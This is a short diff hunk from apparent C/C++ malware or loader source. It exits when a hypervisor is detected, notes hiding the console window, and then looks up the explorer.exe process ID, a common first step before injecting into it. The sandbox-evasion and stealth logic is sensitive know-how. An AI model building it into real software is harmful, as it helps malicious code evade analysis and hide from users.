@@ -16,7 +16,7 @@ int main(){
 	if (cpuid_hypervisor_vendor()) {
 		exit(FALSE);
 	}
-	//FreeConsole(); -> Hide Console 
+	//FreeConsole(); // Dynamic load FreeConsole -> Hide Console 
 
 	int pid = FindProcess(L"explorer.exe");
 	if (pid == 0) {
